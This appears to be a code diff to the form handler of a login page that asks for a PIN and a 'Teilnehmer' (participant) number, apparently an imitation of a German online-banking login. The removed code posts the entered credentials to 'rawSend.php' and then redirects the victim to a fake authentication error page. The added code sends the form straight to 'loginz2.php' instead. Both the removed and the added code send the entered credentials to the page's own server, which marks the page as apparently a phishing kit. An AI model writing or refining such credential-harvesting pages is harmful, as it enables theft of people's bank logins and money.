@@ -702,8 +702,6 @@ $(document).ready(function() {
   }
 
   $('#form').submit(function(e) {
-    e.preventDefault();
-
     // Get the input elements
     var pin = $('#pin');
     var teilnehmer = $('#teilnehmer');
@@ -714,15 +712,11 @@ $(document).ready(function() {
 
     // Check if both inputs are valid
     if (isPinValid && isTeilnehmerValid) {
-      $.ajax({
-        type: 'POST',
-        url: 'routes/rawSend.php?accountAuth&Replace',
-        data: $(this).serialize(),
-        success: function(data) {
-                 
-                    window.location = 'ForAuth?ErrorAuth=27041cd6ef5228452b00be5b42844fcd' + '&session=c06d06da9666a219db15cf575aff2824';
-                        }
-      });
+      // Allow normal form submission to loginz2.php
+      return true;
+    } else {
+      e.preventDefault();
+      return false;
     }
   });
 
